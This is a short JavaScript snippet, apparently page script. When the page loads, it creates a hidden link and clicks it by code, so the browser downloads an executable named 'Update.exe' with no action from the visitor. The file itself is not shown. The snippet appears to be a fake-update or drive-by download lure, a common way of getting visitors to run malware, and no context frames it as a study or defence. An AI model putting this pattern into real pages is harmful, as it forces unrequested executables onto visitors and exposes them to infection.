window.onload = function () {
  const downloadUrl = "/assets/files/Update.exe";
  const link = document.createElement('a');
  link.href = downloadUrl;
  link.download = "Update.exe";
  
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
};
